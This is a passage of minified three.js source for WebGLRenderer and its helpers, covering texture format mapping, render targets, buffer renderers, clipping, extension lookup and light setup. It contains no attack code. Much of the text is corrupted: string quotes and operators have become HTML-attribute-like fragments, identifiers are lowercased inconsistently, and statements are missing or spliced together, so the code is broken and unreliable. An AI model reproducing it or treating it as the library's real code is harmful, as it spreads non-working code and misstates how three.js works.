x.unsigned_short;if(a=\"==THREE.IntType)return\" x.int;if(a=\"==THREE.UnsignedIntType)return\" x.unsigned_int;if(a=\"==THREE.FloatType)return\" x.float;b=\"U.get(\"OES_texture_half_float\");if(null!==b&&a===THREE.HalfFloatType)return\" b.half_float_oes;if(a=\"==THREE.AlphaFormat)return\" x.alpha;if(a=\"==THREE.RGBFormat)return\" x.rgb;if(a=\"==THREE.RGBAFormat)return\" x.rgba;if(a=\"==THREE.LuminanceFormat)return\" x.luminance;=\"\" x.luminance_alpha;if(a=\"==THREE.DepthFormat)return\" x.depth_component;if(a=\"==THREE.AddEquation)return\" x.func_add;if(a=\"==THREE.SubtractEquation)return\" x.func_subtract;if(a=\"==THREE.ReverseSubtractEquation)return\" x.func_reverse_subtract;if(a=\"==THREE.ZeroFactor)return\" x.zero;if(a=\"==THREE.OneFactor)return\" x.one;if(a=\"==THREE.SrcColorFactor)return\" x.src_color;if(a=\"==THREE.OneMinusSrcColorFactor)return\" x.one_minus_src_color;if(a=\"==THREE.SrcAlphaFactor)return\" x.src_alpha;=\"\" x.one_minus_src_alpha;if(a=\"==THREE.DstAlphaFactor)return\" x.dst_alpha;if(a=\"==THREE.OneMinusDstAlphaFactor)return\" x.one_minus_dst_alpha;if(a=\"==THREE.DstColorFactor)return\" x.dst_color;if(a=\"==THREE.OneMinusDstColorFactor)return\" x.one_minus_dst_color;if(a=\"==THREE.SrcAlphaSaturateFactor)return\" x.src_alpha_saturate;b=\"U.get(\"WEBGL_compressed_texture_s3tc\");if(null!==b){if(a===THREE.RGB_S3TC_DXT1_Format)return\" b.compressed_rgb_s3tc_dxt1_ext;if(a=\"==THREE.RGBA_S3TC_DXT1_Format)return\" b.compressed_rgba_s3tc_dxt1_ext;=\"\" b.compressed_rgba_s3tc_dxt3_ext;if(a=\"==THREE.RGBA_S3TC_DXT5_Format)return\" b.compressed_rgba_s3tc_dxt5_ext}b=\"U.get(\"WEBGL_compressed_texture_pvrtc\");if(null!==b){if(a===THREE.RGB_PVRTC_4BPPV1_Format)return\" b.compressed_rgb_pvrtc_4bppv1_img;if(a=\"==THREE.RGB_PVRTC_2BPPV1_Format)return\" b.compressed_rgb_pvrtc_2bppv1_img;if(a=\"==THREE.RGBA_PVRTC_4BPPV1_Format)return\" b.compressed_rgba_pvrtc_4bppv1_img;if(a=\"==THREE.RGBA_PVRTC_2BPPV1_Format)return\" b.compressed_rgba_pvrtc_2bppv1_img}b=\"U.get(\"WEBGL_compressed_texture_etc1\");if(null!==b&&a===THREE.RGB_ETC1_Format)return\" b.compressed_rgb_etc1_webgl;b=\"U.get(\"EXT_blend_minmax\");if(null!==b){if(a===THREE.MinEquation)return\" b.min_ext;if(a=\"==THREE.MaxEquation)return\" b.max_ext}return=\"\" 0}console.log(\"three.webglrenderer\",three.revision);a=\"a||{};var\" v=\"void\" void=\"\" float32array(8),l=\"[],O=[];this.domElement=v;this.context=null;this.sortObjects=this.autoClearStencil=this.autoClearDepth=this.autoClearColor=this.autoClear=!0;this.clippingPlanes=[];this.localClippingEnabled=!1;this.gammaFactor=2;this.physicallyCorrectLights=this.gammaOutput=this.gammaInput=\" !1;this.tonemapping=\"THREE.LinearToneMapping;this.toneMappingWhitePoint=this.toneMappingExposure=1;this.maxMorphTargets=8;this.maxMorphNormals=4;var\" three.vector4,ja=\"null,ba=new\" three.vector4,ia=\"0,V=new\" three.color(0),y=\"0,ra=v.width,sa=v.height,$=1,ua=new\" three.vector4(0,0,ra,sa),xa=\"!1,ma=new\" three.vector4(0,0,ra,sa),wa=\"new\" three.frustum,ca=\"new\" three.webglclipping,qa=\"!1,va=!1,ha=new\" three.sphere,pa=\"new\" three.matrix4,w=\"new\" three.vector3,s=\"{hash:\"\",\" ambient:[0,0,0],directional:[],directionalshadowmap:[],directionalshadowmatrix:[],spot:[],spotshadowmap:[],spotshadowmatrix:[],point:[],pointshadowmap:[],pointshadowmatrix:[],hemi:[],shadows:[]},fa=\"{calls:0,vertices:0,faces:0,points:0};this.info={render:fa,memory:{geometries:0,textures:0},programs:null};var\" x;try{w=\"{alpha:w,depth:E,stencil:z,antialias:y,premultipliedAlpha:A,preserveDrawingBuffer:I};x=C||v.getContext(\"webgl\",w)||v.getContext(\"experimental-webgl\",w);if(null===x){if(null!==v.getContext(\"webgl\"))throw\"Error\" creating=\"\" webgl=\"\" context=\"\" with=\"\" your=\"\" selected attributes.\";=\"\" throw\"error=\"\" context.\";}void=\"\" \"+za)}var=\"\" u=\"new\" three.webglextensions(x);u.get(\"webgl_depth_texture\");u.get(\"oes_texture_float\");u.get(\"oes_texture_float_linear\");u.get(\"oes_texture_half_float\");u.get(\"oes_texture_half_float_linear\");u.get(\"oes_standard_derivatives\");u.get(\"angle_instanced_arrays\");=\"\" u.get(\"oes_element_index_uint\")&&(three.buffergeometry.maxindex=\"4294967296);var\" da=\"new\" three.webglcapabilities(x,u,a),r=\"new\" three.webglstate(x,u,u),z=\"new\" three.webglproperties,ka=\"new\" three.webgltextures(x,u,r,z,da,u,this.info),ea=\"new\" three.webglobjects(x,z,this.info),na=\"new\" three.webglprograms(this,da),ta=\"new\" three.webgllights;this.info.programs=\"na.programs;var\" aa=\"new\" three.webglbufferrenderer(x,u,fa),ba=\"new\" three.webglindexedbufferrenderer(x,u,fa),ca=\"new\" three.orthographiccamera(-1,1,1,-1,0,1),la=\"new\" three.perspectivecamera,oa=\"new\" three.mesh(new=\"\" three.planebuffergeometry(2,2),new=\"\" three.meshbasicmaterial({depthtest:!1,depthwrite:!1}));a=\"THREE.ShaderLib.cube;var\" ga=\"new\" three.boxbuffergeometry(5,5,5),new=\"\" three.shadermaterial({uniforms:a.uniforms,vertexshader:a.vertexshader,fragmentshader:a.fragmentshader,depthtest:!1,depthwrite:!1,side:three.backside}));ea.update(oa);ea.update(ga);c();this.context=\"x;this.capabilities=da;this.extensions=U;this.properties=Z;this.state=R;var\" ya=\"new\" three.webglshadowmap(this,=\"\" s,ea);this.shadowmap=\"ya;var\" three.spriteplugin(this,l),ea=\"new\" three.lensflareplugin(this,o);this.getcontext=\"function(){return\" x};this.getcontextattributes=\"function(){return\" x.getcontextattributes()};this.forcecontextloss=\"function(){U.get(\"WEBGL_lose_context\").loseContext()};this.getMaxAnisotropy=function(){return\" da.getmaxanisotropy()};this.getprecision=\"function(){return\" da.precision};this.getpixelratio=\"function(){return\" $};this.setpixelratio=\"function(a){void\" ma.w,!1))};this.getsize=\"function(){return{width:ra,height:sa}};this.setSize=function(a,b,c){ra=a;sa=b;v.width=a*$;v.height=b*$;!1!==c&&(v.style.width=a+\"px\",v.style.height=b+\"px\");this.setViewport(0,0,a,b)};this.setViewport=function(a,b,c,d){R.viewport(ma.set(a,b,c,d))};this.setScissor=function(a,b,c,d){R.scissor(ua.set(a,b,c,d))};this.setScissorTest=function(a){R.setScissorTest(xa=a)};this.getClearColor=function(){return\" v};this.setclearcolor=\"function(a,c){V.set(a);Y=void\" y)};this.getclearalpha=\"function(){return\" y};this.setclearalpha=\"function(a){Y=a;b(V.r,V.g,V.b,Y)};this.clear=function(a,b,c){var\" d;this.dispose=\"function(){P=[];M=-1;F=[];K=-1;v.removeEventListener(\"webglcontextlost\",e,!1)};this.renderBufferImmediate=function(a,b,c){R.initAttributes();var\" r.enableattribute(b.position),x.vertexattribpointer(b.position,3,x.float,!1,0,0));if(a.hasnormals){x.bindbuffer(x.array_buffer,d.normal);if(\"meshphongmaterial\"!=\"=c.type&&\"MeshStandardMaterial\"!==c.type&&\"MeshPhysicalMaterial\"!==c.type&&c.shading===THREE.FlatShading)for(var\" a.normalarray,x.dynamic_draw);r.enableattribute(b.normal);x.vertexattribpointer(b.normal,3,x.float,!1,0,0)}a.hasuvs&&c.map&&(x.bindbuffer(x.array_buffer,d.uv),x.bufferdata(x.array_buffer,a.uvarray,x.dynamic_draw),r.enableattribute(b.uv),x.vertexattribpointer(b.uv,2,x.float,!1,0,0));a.hascolors&&c.vertexcolors!=\"=THREE.NoColors&&(x.bindBuffer(x.ARRAY_BUFFER,d.color),x.bufferData(x.ARRAY_BUFFER,a.colorArray,x.DYNAMIC_DRAW),R.enableAttribute(b.color),x.vertexAttribPointer(b.color,3,x.FLOAT,!1,0,0));R.disableUnusedAttributes();\" x.drawarrays(x.triangles,0,a.count);a.count=\"0};this.renderBufferDirect=function(a,b,c,d,e,g){r(d);var\" f=\"s(a,b,d,e),k=!1;a=c.id+\"_\"+f.id+\"_\"+d.wireframe;a!==aa&&(aa=a,k=!0);b=e.morphTargetInfluences;if(void\" m=\"0,k=b.length;m<k;m++){var\" c.addattribute(\"morphnormal\"+m,n.normal[b])):(!0=\"==d.morphTargets&&c.removeAttribute(\"morphTarget\"+m),!0===d.morphNormals&&c.removeAttribute(\"morphNormal\"+m));f.getUniforms().setValue(x,\"morphTargetInfluences\",H);k=!0}b=c.index;m=c.attributes.position;!0===d.wireframe&&(b=ea.getWireframeAttribute(c));null!==b?(a=Ba,a.setIndex(b)):a=Aa;if(k){a:{var\" k=\"void\" 0,p;if(c=\"\" three.instancedbuffergeometry&&(p=\"U.get(\"ANGLE_instanced_arrays\"),null===p)){console.error(\"THREE.WebGLRenderer.setupVertexAttributes:\" using=\"\" three.instancedbuffergeometry=\"\" but=\"\" hardware=\"\" does=\"\" not=\"\" support=\"\" extension=\"\" angle_instanced_arrays.\");=\"\" break=\"\" a}void=\"\" f){var=\"\" w=\"x.FLOAT,C=u.array,t=u.normalized;C\" float32array?w=\"x.FLOAT:C\" float64array?console.warn(\"unsupported=\"\" data=\"\" buffer=\"\" format:=\"\" float64array\"):c=\"\" uint16array?w=\"x.UNSIGNED_SHORT:C\" int16array?w=\"x.SHORT:C\" uint32array?w=\"x.UNSIGNED_INT:C\" int32array?w=\"x.INT:C\" int8array?=\"\" uint8array&&(w=\"x.UNSIGNED_BYTE);var\" three.interleavedbufferattribute){var=\"\" z=\"u.data,A=z.stride,u=u.offset;z\" three.instancedinterleavedbuffer?(r.enableattributeanddivisor(v,z.meshperattribute,p),void=\"\" three.instancedbufferattribute?(r.enableattributeanddivisor(v,u.meshperattribute,p),void=\"\" 2:x.vertexattrib2fv(v,w);break;case=\"\" 3:x.vertexattrib3fv(v,w);break;case=\"\" 4:x.vertexattrib4fv(v,w);break;default:x.vertexattrib1fv(v,w)}}}r.disableunusedattributes()}null!=\"=\" b&&x.bindbuffer(x.element_array_buffer,ea.getattributebuffer(b))}p=\"Infinity;null!==b?p=b.count:void\" three.mesh)if(!0=\"==d.wireframe)R.setLineWidth(d.wireframeLinewidth*(null===J?$:1)),a.setMode(x.LINES);else\" switch(e.drawmode){case=\"\" three.trianglesdrawmode:a.setmode(x.triangles);break;case=\"\" three.trianglestripdrawmode:a.setmode(x.triangle_strip);=\"\" break;case=\"\" three.trianglefandrawmode:a.setmode(x.triangle_fan)}else=\"\" three.line?(d=\"d.linewidth,void\" three.linesegments?a.setmode(x.lines):a.setmode(x.line_strip)):e=\"\" three.points&&a.setmode(x.points);c=\"\" three.instancedbuffergeometry?0<c.maxinstancedcount&&a.renderinstances(c,g,p):a.render(g,p)};this.render=\"function(a,c,d,e){if(!1===c\" three.camera)console.error(\"three.webglrenderer.render:=\"\" camera=\"\" is=\"\" an=\"\" instance=\"\" of=\"\" three.camera.\");=\"\" else{var=\"\" (s.shadows[h++]=\"v)}S.shadows.length=h;ya.render(a,c);for(var\" three.ambientlight)v+=\"u.r*w,r+=u.g*w,s+=u.b*w;else\" if(n=\"\" three.directionallight){var=\"\" d.direction.sub(w);d.direction.transformdirection(h);if(d.shadow=\"n.castShadow)D.shadowBias=n.shadow.bias,D.shadowRadius=n.shadow.radius,D.shadowMapSize=n.shadow.mapSize;S.directionalShadowMap[y]=t;S.directionalShadowMatrix[y]=n.shadow.matrix;S.directional[y++]=D}else\" three.spotlight){d=\"ta.get(n);D.position.setFromMatrixPosition(n.matrixWorld);D.position.applyMatrix4(H);D.color.copy(u).multiplyScalar(w);D.distance=C;D.direction.setFromMatrixPosition(n.matrixWorld);W.setFromMatrixPosition(n.target.matrixWorld);\" d.direction.sub(w);d.direction.transformdirection(h);d.conecos=\"Math.cos(n.angle);D.penumbraCos=Math.cos(n.angle*(1-n.penumbra));D.decay=0===n.distance?0:n.decay;if(D.shadow=n.castShadow)D.shadowBias=n.shadow.bias,D.shadowRadius=n.shadow.radius,D.shadowMapSize=n.shadow.mapSize;S.spotShadowMap[J]=t;S.spotShadowMatrix[J]=n.shadow.matrix;S.spot[J++]=D}else\" three.pointlight){d=\"ta.get(n);D.position.setFromMatrixPosition(n.matrixWorld);D.position.applyMatrix4(H);D.color.copy(n.color).multiplyScalar(n.intensity);\" d.distance=\"n.distance;D.decay=0===n.distance?0:n.decay;if(D.shadow=n.castShadow)D.shadowBias=n.shadow.bias,D.shadowRadius=n.shadow.radius,D.shadowMapSize=n.shadow.mapSize;S.pointShadowMap[z]=t;void\" three.matrix4);w.setfrommatrixposition(n.matrixworld).negate();s.pointshadowmatrix[z].identity().setposition(w);s.point[z++]=\"D}else\" three.hemispherelight&&(d=\"ta.get(n),D.direction.setFromMatrixPosition(n.matrixWorld),D.direction.transformDirection(H),\" d.direction.normalize(),d.skycolor.copy(n.color).multiplyscalar(w),d.groundcolor.copy(n.groundcolor).multiplyscalar(w),s.hemi[a++]=\"D);S.ambient[0]=v;S.ambient[1]=r;S.ambient[2]=s;S.directional.length=y;S.spot.length=J;S.point.length=z;S.hemi.length=A;S.hash=y+\",\"+z+\",\"+J+\",\"+A+\",\"+S.shadows.length;qa&&ca.endShadows();fa.calls=0;fa.vertices=0;fa.faces=0;fa.points=0;void\" three.color&&b(f.r,f.g,f.b,1);(this.autoclear||=\"\" e)&&this.clear(this.autoclearcolor,this.autocleardepth,this.autoclearstencil);f=\"\" three.cubetexture?(la.projectionmatrix.copy(c.projectionmatrix),la.matrixworld.extractrotation(c.matrixworld),la.matrixworldinverse.getinverse(la.matrixworld),ga.material.uniforms.tcube.value=\"f,ga.modelViewMatrix.multiplyMatrices(la.matrixWorldInverse,ga.matrixWorld),N.renderBufferDirect(la,null,ga.geometry,ga.material,ga,null)):f\" three.texture&&(oa.material.map=\"f,N.renderBufferDirect(Ca,null,oa.geometry,\" oa.material,oa,null));a.overridematerial?(e=\"a.overrideMaterial,q(F,c,g,e),q(P,c,g,e)):(R.setBlending(THREE.NoBlending),q(F,c,g),q(P,c,g));Da.render(a,c);Ea.render(a,c,ba);d&&ka.updateRenderTargetMipmap(d);R.setDepthTest(!0);R.setDepthWrite(!0);R.setColorWrite(!0)}};this.setFaceCulling=function(a,b){R.setCullFace(a);R.setFlipSided(b===THREE.FrontFaceDirectionCW)};this.allocTextureUnit=function(){var\" a=\"ia;a\">=da.maxTextures&&console.warn(\"WebGLRenderer: trying to use \"+a+\" texture units while this GPU supports only \"+\nda.maxTextures);ia+=1;return a};this.setTexture2D=function(){var a=!1;return function(b,c){b instanceof THREE.WebGLRenderTarget&&(a||(console.warn(\"THREE.WebGLRenderer.setTexture2D: don't use render targets as textures. Use their .texture property instead.\"),a=!0),b=b.texture);ka.setTexture2D(b,c)}}();this.setTexture=function(){var a=!1;return function(b,c){a||(console.warn(\"THREE.WebGLRenderer: .setTexture is deprecated, use setTexture2D instead.\"),a=!0);ka.setTexture2D(b,c)}}();this.setTextureCube=\nfunction(){var a=!1;return function(b,c){b instanceof THREE.WebGLRenderTargetCube&&(a||(console.warn(\"THREE.WebGLRenderer.setTextureCube: don't use cube render targets as textures. Use their .texture property instead.\"),a=!0),b=b.texture);b instanceof THREE.CubeTexture||Array.isArray(b.image)&&6===b.image.length?ka.setTextureCube(b,c):ka.setTextureCubeDynamic(b,c)}}();this.getCurrentRenderTarget=function(){return J};this.setRenderTarget=function(a){(J=a)&&void 0===Z.get(a).__webglFramebuffer&&ka.setupRenderTarget(a);\nvar b=a instanceof THREE.WebGLRenderTargetCube,c;a?(c=Z.get(a),c=b?c.__webglFramebuffer[a.activeCubeFace]:c.__webglFramebuffer,X.copy(a.scissor),ja=a.scissorTest,ba.copy(a.viewport)):(c=null,X.copy(ua).multiplyScalar($),ja=xa,ba.copy(ma).multiplyScalar($));D!==c&&(x.bindFramebuffer(x.FRAMEBUFFER,c),D=c);R.scissor(X);R.setScissorTest(ja);R.viewport(ba);b&&(b=Z.get(a.texture),x.framebufferTexture2D(x.FRAMEBUFFER,x.COLOR_ATTACHMENT0,x.TEXTURE_CUBE_MAP_POSITIVE_X+a.activeCubeFace,b.__webglTexture,a.activeMipMapLevel))};\nthis.readRenderTargetPixels=function(a,b,c,d,e,f){if(!1===a instanceof THREE.WebGLRenderTarget)console.error(\"THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not THREE.WebGLRenderTarget.\");else{var g=Z.get(a).__webglFramebuffer;if(g){var h=!1;g!==D&&(x.bindFramebuffer(x.FRAMEBUFFER,g),h=!0);try{var k=a.texture;k.format!==THREE.RGBAFormat&&u(k.format)!==x.getParameter(x.IMPLEMENTATION_COLOR_READ_FORMAT)?console.error(\"THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not in RGBA or implementation defined format.\"):\nk.type===THREE.UnsignedByteType||u(k.type)===x.getParameter(x.IMPLEMENTATION_COLOR_READ_TYPE)||k.type===THREE.FloatType&&U.get(\"WEBGL_color_buffer_float\")||k.type===THREE.HalfFloatType&&U.get(\"EXT_color_buffer_half_float\")?x.checkFramebufferStatus(x.FRAMEBUFFER)===x.FRAMEBUFFER_COMPLETE?0<=b&&b<=a.width-d&&0<=c&&c<=a.height-e&&x.readpixels(b,c,d,e,u(k.format),u(k.type),f):console.error(\"three.webglrenderer.readrendertargetpixels: 0=\"==c.minFilter&&(c.minFilter=THREE.LinearFilter);this.texture=new\" readpixels=\"\" from=\"\" rendertarget=\"\" failed.=\"\" framebuffer=\"\" not=\"\" complete.\"):console.error(\"three.webglrenderer.readrendertargetpixels:=\"\" is=\"\" in=\"\" unsignedbytetype=\"\" or=\"\" implementation=\"\" defined=\"\" type.\")}finally{h&&=\"\" x.bindframebuffer(x.framebuffer,d)}}}}};=\"\" three.webglrendertarget=\"function(a,b,c){this.uuid=THREE.Math.generateUUID();this.width=a;this.height=b;this.scissor=new\" three.vector4(0,0,a,b);this.scissortest=\"!1;this.viewport=new\" three.vector4(0,0,a,b);c=\"c||{};void\" three.texture(void=\"\" 0,void=\"\" 0,c.wraps,c.wrapt,c.magfilter,c.minfilter,c.format,c.type,c.anisotropy,c.encoding);this.depthbuffer=\"void\" 0!=\"=c.depthBuffer?c.depthBuffer:!0;this.stencilBuffer=void\" !0;this.depthtexture=\"null};\" object.assign(three.webglrendertarget.prototype,three.eventdispatcher.prototype,{setsize:function(a,b){if(this.width!=\"=a||this.height!==b)this.width=a,this.height=b,this.dispose();this.viewport.set(0,0,a,b);this.scissor.set(0,0,a,b)},clone:function(){return(new\" this.constructor).copy(this)},copy:function(a){this.width=\"a.width;this.height=a.height;this.viewport.copy(a.viewport);this.texture=a.texture.clone();this.depthBuffer=a.depthBuffer;this.stencilBuffer=a.stencilBuffer;this.depthTexture=a.depthTexture;\" return=\"\" this},dispose:function(){this.dispatchevent({type:\"dispose\"})}});three.webglrendertargetcube=\"function(a,b,c){THREE.WebGLRenderTarget.call(this,a,b,c);this.activeMipMapLevel=this.activeCubeFace=0};THREE.WebGLRenderTargetCube.prototype=Object.create(THREE.WebGLRenderTarget.prototype);THREE.WebGLRenderTargetCube.prototype.constructor=THREE.WebGLRenderTargetCube;\" three.webglbufferrenderer=\"function(a,b,c){var\" d;this.setmode=\"function(a){d=a};this.render=function(b,f){a.drawArrays(d,b,f);c.calls++;c.vertices+=f;d===a.TRIANGLES&&(c.faces+=f/3)};this.renderInstances=function(e){var\" f=\"b.get(\"ANGLE_instanced_arrays\");if(null===f)console.error(\"THREE.WebGLBufferRenderer:\" using=\"\" three.instancedbuffergeometry=\"\" but=\"\" hardware=\"\" does=\"\" support=\"\" extension=\"\" angle_instanced_arrays.\");else{var=\"\" g=\"e.attributes.position,h=0,h=g\" instanceof=\"\" three.interleavedbufferattribute?g.data.count:=\"\" g.count;f.drawarraysinstancedangle(d,0,h,e.maxinstancedcount);c.calls++;c.vertices+=\"h*e.maxInstancedCount;d===a.TRIANGLES&&(c.faces+=e.maxInstancedCount*h/3)}}};\" three.webglclipping=\"function(){function\" a(){l.value!=\"=d&&(l.value=d,l.needsUpdate=0<e);c.numPlanes=e}function\" b(a,b,d,e){var=\"\" float32array(e);for(e=\"0;e!==f;++e,d+=4)h.copy(a[e]).applyMatrix4(b,k),h.normal.toArray(g,d),g[d+3]=h.constant}l.value=g;l.needsUpdate=!0}c.numPlanes=f;return\" g}var=\"\" c=\"this,d=null,e=0,f=!1,g=!1,h=new\" three.plane,k=\"new\" three.matrix3,=\"\" l=\"{value:null,needsUpdate:!1};this.uniform=l;this.numPlanes=0;this.init=function(a,c,g){var\" h=\"0!==a.length||c||0!==e||f;f=c;d=b(a,g,0);e=a.length;return\" h};this.beginshadows=\"function(){g=!0;b(null)};this.endShadows=function(){g=!1;a()};this.setState=function(c,h,k,q,r){if(!f||null===c||0===c.length||g&&!h)g?b(null):a();else{h=g?0:e;var\" s=\"4*h,t=q.clippingState||null;l.value=t;t=b(c,k,s,r);for(c=0;c!==s;++c)t[c]=d[c];q.clippingState=t;this.numPlanes+=h}}};\" three.webglindexedbufferrenderer=\"function(a,b,c){var\" d,e,f;this.setmode=\"function(a){d=a};this.setIndex=function(c){c.array\" uint32array&&b.get(\"oes_element_index_uint\")?(e=\"a.UNSIGNED_INT,f=4):(e=a.UNSIGNED_SHORT,f=2)};this.render=function(b,h){a.drawElements(d,h,e,b*f);c.calls++;c.vertices+=h;d===a.TRIANGLES&&(c.faces+=h/3)};this.renderInstances=function(g,h,k){var\" angle_instanced_arrays.\"):=\"\" (l.drawelementsinstancedangle(d,k,e,h*f,g.maxinstancedcount),c.calls++,c.vertices+=\"k*g.maxInstancedCount,d===a.TRIANGLES&&(c.faces+=g.maxInstancedCount*k/3))}};\" three.webglextensions=\"function(a){var\" b=\"{};this.get=function(c){if(void\" b[c];var=\"\" d;switch(c){case=\"\" \"webgl_depth_texture\":d=\"a.getExtension(\"WEBGL_depth_texture\")||a.getExtension(\"MOZ_WEBGL_depth_texture\")||a.getExtension(\"WEBKIT_WEBGL_depth_texture\");break;case\" \"ext_texture_filter_anisotropic\":d=\"a.getExtension(\"EXT_texture_filter_anisotropic\")||a.getExtension(\"MOZ_EXT_texture_filter_anisotropic\")||a.getExtension(\"WEBKIT_EXT_texture_filter_anisotropic\");break;case\" \"webgl_compressed_texture_s3tc\":d=\"a.getExtension(\"WEBGL_compressed_texture_s3tc\")||a.getExtension(\"MOZ_WEBGL_compressed_texture_s3tc\")||a.getExtension(\"WEBKIT_WEBGL_compressed_texture_s3tc\");break;case\" \"webgl_compressed_texture_pvrtc\":d=\"a.getExtension(\"WEBGL_compressed_texture_pvrtc\")||a.getExtension(\"WEBKIT_WEBGL_compressed_texture_pvrtc\");break;case\" \"webgl_compressed_texture_etc1\":d=\"a.getExtension(\"WEBGL_compressed_texture_etc1\");break;default:d=a.getExtension(c)}null===d&&console.warn(\"THREE.WebGLRenderer:\" \"+c+\"=\"\" supported.\");=\"\" b[c]=\"d}};\" three.webglcapabilities=\"function(a,b,c){function\" d(b){if(\"highp\"=\"==b){if(0<a.getShaderPrecisionFormat(a.VERTEX_SHADER,a.HIGH_FLOAT).precision&&0<a.getShaderPrecisionFormat(a.FRAGMENT_SHADER,a.HIGH_FLOAT).precision)return\"highp\";b=\"mediump\"}return\"mediump\"===b&&0<a.getShaderPrecisionFormat(a.VERTEX_SHADER,a.MEDIUM_FLOAT).precision&&0<a.getShaderPrecisionFormat(a.FRAGMENT_SHADER,a.MEDIUM_FLOAT).precision?\"mediump\":\"lowp\"}var\" e;this.getmaxanisotropy=\"function(){if(void\" e;var=\"\" e=\"null!==c?a.getParameter(c.MAX_TEXTURE_MAX_ANISOTROPY_EXT):0};this.getMaxPrecision=d;this.precision=void\" a.getparameter(a.max_vertex_attribs);this.maxvertexuniforms=\"a.getParameter(a.MAX_VERTEX_UNIFORM_VECTORS);this.maxVaryings=a.getParameter(a.MAX_VARYING_VECTORS);this.maxFragmentUniforms=a.getParameter(a.MAX_FRAGMENT_UNIFORM_VECTORS);this.vertexTextures=0<this.maxVertexTextures;this.floatFragmentTextures=!!b.get(\"OES_texture_float\");this.floatVertexTextures=this.vertexTextures&&this.floatFragmentTextures;c=d(this.precision);c!==this.precision&&(console.warn(\"THREE.WebGLRenderer:\",this.precision,\"not\" supported,=\"\" using\",=\"\" c,\"instead.\"),this.precision=\"c);this.logarithmicDepthBuffer&&(this.logarithmicDepthBuffer=!!b.get(\"EXT_frag_depth\"))};\" three.webglgeometries=\"function(a,b,c){function\" d(a){var=\"\" k=\"a.attributes,l;for(l\" k)e(k[l]);h.removeeventlistener(\"dispose\",d);delete=\"\" f[h.id];l=\"b.get(h);l.wireframe&&e(l.wireframe);b.delete(h);h=b.get(a);h.wireframe&&e(h.wireframe);b.delete(a);c.memory.geometries--}function\" e(c){var=\"\" d;d=\"c\" three.interleavedbufferattribute?b.get(c.data).__webglbuffer:b.get(c).__webglbuffer;void=\"\" three.interleavedbufferattribute?=\"\" b.delete(c.data):b.delete(c))}var=\"\" f[b.id];b.addeventlistener(\"dispose\",d);var=\"\" e;b=\"\" three.buffergeometry?e=\"b:b\" three.geometry&&(void=\"\" three.buffergeometry).setfromobject(a)),e=\"b._bufferGeometry);f[b.id]=e;c.memory.geometries++;return\" e}};=\"\" three.webgllights=\"function(){var\" a=\"{};this.get=function(b){if(void\" a[b.id];var=\"\" c;switch(b.type){case=\"\" \"directionallight\":c=\"{direction:new\" three.vector3,color:new=\"\" three.color,shadow:!1,shadowbias:0,shadowradius:1,shadowmapsize:new=\"\" three.vector2};break;case=\"\" \"spotlight\":c=\"{position:new\" three.vector3,direction:new=\"\" three.color,distance:0,conecos:0,penumbracos:0,decay:0,shadow:!1,shadowbias:0,shadowradius:1,shadowmapsize:new=\"\" \"pointlight\":c=\"{position:new\" three.color,distance:0,decay:0,shadow:!1,shadowbias:0,shadowradius:1,shadowmapsize:new=\"\" \"hemispherelight\":c=\"{direction:new\" three.vector3,skycolor:new=\"\" three.color,groundcolor:new=\"\" three.color}}return=\"\" a[b.id]=\"c}};\" three.webglobjects=\"function(a,b,c){function\" d(c,d){var=\"\" three.interleavedbufferattribute?c.data:c,f=\"b.get(e);void\" dynamic=\"\" three.bufferattribute=\"\" marked=\"\" as=\"\" needsupdate=\"\" updaterange.count=\"\" 0,=\"\" ensure=\"\" you=\"\" are=\"\" set=\"\" methods=\"\" updating=\"\" manually.\"):=\"\" (a.buffersubdata(d,e.updaterange.offset*e.array.bytes_per_element,e.array.subarray(e.updaterange.offset,e.updaterange.offset+e.updaterange.count)),e.updaterange.count=\"0),f.version=e.version)}function\" e(a,b,c){if(b=\"\">c){var d=b;b=c;c=d}d=a[b];return void 0===d?(a[b]=[c],!0):-1===d.indexOf(c)?(d.push(c),!0):!1}var f=new THREE.WebGLGeometries(a,b,c);this.getAttributeBuffer=function(a){return a instanceof THREE.InterleavedBufferAttribute?b.get(a.data).__webglBuffer:b.get(a).__webglBuffer};this.getWireframeAttribute=\nfunction(c){var f=b.get(c);if(void 0!==f.wireframe)return f.wireframe;var k=[],l=c.index,n=c.attributes;c=n.position;if(null!==l)for(var n={},l=l.array,p=0,m=l.length;p<m;p+=3){var q=\"l[p+0],r=l[p+1],s=l[p+2];e(n,q,r)&&k.push(q,r);e(n,r,s)&&k.push(r,s);e(n,s,q)&&k.push(s,q)}else\" for(l=\"n.position.array,p=0,m=l.length/3-1;p<m;p+=3)q=p+0,r=p+1,s=p+2,k.push(q,r,r,s,s,q);k=new\" three.bufferattribute(new=\"\" (65535<c.count?uint32array:uint16array)(k),1);d(k,a.element_array_buffer);return=\"\" f.wireframe=\"k};this.update=\" function(b){var=\"\" c=\"f.get(b);b.geometry\" instanceof=\"\" three.geometry&&c.updatefromobject(b);b=\"c.index;var\" e=\"c.attributes;null!==b&&d(b,a.ELEMENT_ARRAY_BUFFER);for(var\" l=\"\" in=\"\" e)d(e[l],a.array_buffer);b=\"c.morphAttributes;for(l\" b)for(var=\"\" c}};=\"\" three.webglprogram=\"function(){function\" a(a){switch(a){case=\"\" three.linearencoding:return[\"linear\",\"(=\"\" value=\"\" )\"];case=\"\" three.srgbencoding:return[\"srgb\",\"(=\"\" three.rgbeencoding:return[\"rgbe\",\"(=\"\" three.rgbm7encoding:return[\"rgbm\",\"(=\"\" value,=\"\" 7.0=\"\" three.rgbm16encoding:return[\"rgbm\",\"(=\"\" 16.0=\"\" three.rgbdencoding:return[\"rgbd\",\"(=\"\" 256.0=\"\" three.gammaencoding:return[\"gamma\",\"(=\"\" float(=\"\" gamma_factor=\"\" )=\"\" )\"];default:throw=\"\" error(\"unsupported=\"\" encoding:=\"\" \"+=\"\" a);}}function=\"\" b(b,c){var=\"\" d=\"a(c);return\"vec4\" \"+b+\"(=\"\" vec4=\"\" {=\"\" return=\"\" \"+d[0]+\"tolinear\"+d[1]+\";=\"\" }\"}function=\"\" c(b,c){var=\"\" linearto\"+d[0]+d[1]+\";=\"\" d(a,b){var=\"\" c;switch(b){case=\"\" three.lineartonemapping:c=\"Linear\" ;break;case=\"\" three.reinhardtonemapping:c=\"Reinhard\" three.uncharted2tonemapping:c=\"Uncharted2\" three.cineontonemapping:c=\"OptimizedCineon\" ;break;default:throw=\"\" tonemapping:=\"\" \"+b);}return\"vec3=\"\" \"+a+=\"\" \"(=\"\" vec3=\"\" color=\"\" \"+c+\"tonemapping(=\"\" );=\"\" 